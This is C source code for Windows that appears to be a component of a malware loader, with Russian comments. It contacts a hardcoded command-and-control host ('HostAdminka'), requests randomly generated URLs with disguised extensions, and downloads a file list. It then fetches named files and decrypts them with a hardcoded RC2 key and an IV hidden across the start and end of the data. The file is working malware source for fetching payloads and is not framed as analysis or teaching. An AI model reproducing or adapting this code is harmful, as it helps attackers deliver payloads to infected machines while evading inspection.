#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <urlmon.h>
#include <wincrypt.h>
#include <util.h>
#include "loaddll.h"
#include "util.h"

//#pragma library("wininet.lib");
//#pragma library("urlmon.lib");
//#pragma library("crypt32.lib");



#define CUR_BLOB_VERSION 2
#define CRYPT_STRING_BASE64                 0x00000001L
#define WINCRYPT32STRINGAPI DECLSPEC_IMPORT

//WINCRYPT32STRINGAPI BOOL WINAPI CryptStringToBinaryA( LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD * );
//#define CryptStringToBinary         CryptStringToBinaryA

const char* UserAgent = 0; //"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
const char* RC2_Password = "bRS8yYQ0APq9xfzC";
const char* HostAdminka = "rus.gipa.in";

//расширения для генерации урлов
const char* SETFolderExts[] = { ".phtml", ".php3", ".phtm", ".inc", ".7z" };

int GenerateKey( const char* password, const char* IV, HCRYPTPROV* provider, HCRYPTKEY* key);
char* DecodeData( char* data, int szData, int* retData );

char* LoadFileFromAdminka( const char* nameFile, int* size )
{
 char* ret = 0;
 int szData = 0;
 char urlList[96];

 int symbols = u_rand_range( 57, 64 ); //символов в урле
 for( int i = 0; i < symbols; i++ )
   urlList[i] = u_rand_range( 'a', 'z' );
 urlList[symbols] = 0;
 _lstrcatA( urlList, SETFolderExts[ u_rand() % (sizeof(SETFolderExts) / sizeof(char*)) ] );
 char* data = LoadFileFromInet( HostAdminka, urlList, &szData, "b=1", 3 );
 if( data ) {
   int szList = 0;
   char* list = DecodeData( data, szData, &szList );
   //ищем нужный файл
   const char* p = u_istrstr( list, nameFile );
   if( p ) {
     int len = _lstrlen(nameFile);
     p += len;
     if( *p == '|' ) {
       p++;
       char* p2 = (char*)u_strchr( p, '\n' );
       if( p2 ) *p2 = 0;
       int szFile;
       char* dataFile = LoadFileFromInet( HostAdminka, p, &szFile );
       if( dataFile ) {
         ret = DecodeData( dataFile, szFile, size );
         u_free(dataFile);
       }
     }
   }
   u_free(list);
 }
 u_free(data);
 return ret;
}

char* LoadFileFromRequest( HINTERNET request, int* size )
{
 char buf[1024];
 DWORD readed = 0;
 *size = 0;
 char* ret = 0;
 do {
   _InternetReadFile( request, buf, sizeof(buf), &readed );
   if( readed > 0 ) {
     char* ret2 = u_alloc( *size + readed, 0 );
     if( ret ) u_memcpy( ret2, ret, *size );
     u_memcpy( ret2 + *size, buf, readed );
     *size += readed;
     u_free(ret);
     ret = ret2;
   }
 } while( readed == sizeof(buf) );
 return ret;
}

char* LoadFileFromInet( const char* host, const char* url, int* size, const char* postData, int szPostData )
{
 char* ret = 0;
 *size = 0;
 char defUserAgent[512];
 const char* userAgent = UserAgent;
 if( UserAgent == 0 ) {
   DWORD szUserAgent = sizeof(defUserAgent);
   _ObtainUserAgentString( 0, defUserAgent, &szUserAgent );
   userAgent = defUserAgent;
 }
 HINTERNET inet = _InternetOpenA( userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, 0, 0);
 if( inet ) {
    HINTERNET connect = _InternetConnectA( inet, host, INTERNET_DEFAULT_HTTP_PORT, NULL,NULL, INTERNET_SERVICE_HTTP, 0, 1u );
    if( connect ) { 
      // Пост запрос
      HINTERNET request = _HttpOpenRequestA( connect, postData ? "POST" : 0, url, NULL, NULL, 0, 0, 1 ); 
      if( request ) {
        // Добавляем необходимые параметры запроса
        if( postData ) {
          _HttpAddRequestHeadersA( request, "Accept: */*", -1, HTTP_ADDREQ_FLAG_ADD );
          _HttpAddRequestHeadersA( request, "Content-Type: application/x-www-form-urlencoded", -1, HTTP_ADDREQ_FLAG_ADD );
          _HttpAddRequestHeadersA( request, "Content-Length: 3", -1, HTTP_ADDREQ_FLAG_ADD );
        }
        BOOL res = _HttpSendRequestA( request, 0, 0, (void*)postData, szPostData );        
        if( res ) {
          ret = LoadFileFromRequest( request, size );
        }
        _InternetCloseHandle(request);
      }
      _InternetCloseHandle(connect);
    }
    _InternetCloseHandle(inet);
 }
 return ret;
}

char* DecodeData( char* data, int szData, int* retData )
{
 char IV[8];
 *retData = 0;
 //извлекаем вектор из 8 символов, части которого находятся в начале data (4-е символа) и в конце (4-е символа)
 *((DWORD*)IV) = *((DWORD*)data); //копируем 1-е четыре символа
 char *p, *p2; p = p2 = data + szData - 1;
 while( *p == '=' ) p--;
 int ca = p2 - p; //количество знаков = в конце
 p -= 3;
 *((DWORD*)(IV + 4)) = *((DWORD*)p); //копируем последние четыре символа (перед знаками '=')
 while( ca-- ) *p++ = *p2--; //переносим знаки =
 szData -= 8;
 u_memcpy( data, data + 4, szData );

 char* data2 = u_alloc( szData, 0 );
 DWORD szData2 = szData;
 _CryptStringToBinaryA( data, szData, CRYPT_STRING_BASE64, (BYTE*)data2, &szData2, 0, 0 );

 //декодирование по RC2
 HCRYPTPROV provider;
 HCRYPTKEY key;
 if( GenerateKey( RC2_Password, IV, &provider, &key ) ) {
   if( _CryptDecrypt( key, 0, TRUE, 0, (BYTE*)data2, &szData2 )) {
     data2[szData2] = 0;
     *retData = szData2;
   }
   else {
     u_free(data2);
     data2 = 0;
   }

   _CryptDestroyKey(key);
   _CryptReleaseContext( provider, 0 );
 }

 return data2;
}

typedef struct 
{
	BLOBHEADER KeyHeader;
    DWORD KeySize;
	BYTE KeyData[64];
} TKeyBlob;

// Генерировать ключ криптования на основе пароля и вектора инициализации IV
int GenerateKey( const char* password, const char* IV, HCRYPTPROV* provider, HCRYPTKEY* key)
{
 *provider = 0;
 *key = 0;

// Поключаемся к провайдеру
 if( _CryptAcquireContextA( provider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
 {
   TKeyBlob keyBlob;
   // импортируем ключ
   u_memset( &keyBlob, 0, sizeof(keyBlob) );
   keyBlob.KeyHeader.bType    = PLAINTEXTKEYBLOB;
   keyBlob.KeyHeader.bVersion = CUR_BLOB_VERSION;
   keyBlob.KeyHeader.aiKeyAlg = CALG_RC2;

   keyBlob.KeySize = lstrlen(password);
   u_memcpy( (char*)keyBlob.KeyData, password, keyBlob.KeySize );

   if( _CryptImportKey( *provider, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, key ) )
   {
     // Настраиваем ключ
     if( _CryptSetKeyParam( *key, KP_IV, (BYTE*)IV, 0 ) )
     {
       DWORD CryptMode = CRYPT_MODE_CBC;
       if( _CryptSetKeyParam( *key, KP_MODE, (BYTE*)&CryptMode, 0 ) )
       {
         DWORD PadMode = PKCS5_PADDING;
         if( _CryptSetKeyParam( *key, KP_PADDING, (BYTE*)&PadMode, 0 ) )
           return 1;
       }
     }
     _CryptDestroyKey(*key);
   }
   _CryptReleaseContext( *provider, 0 );
 }
 return 0;
}
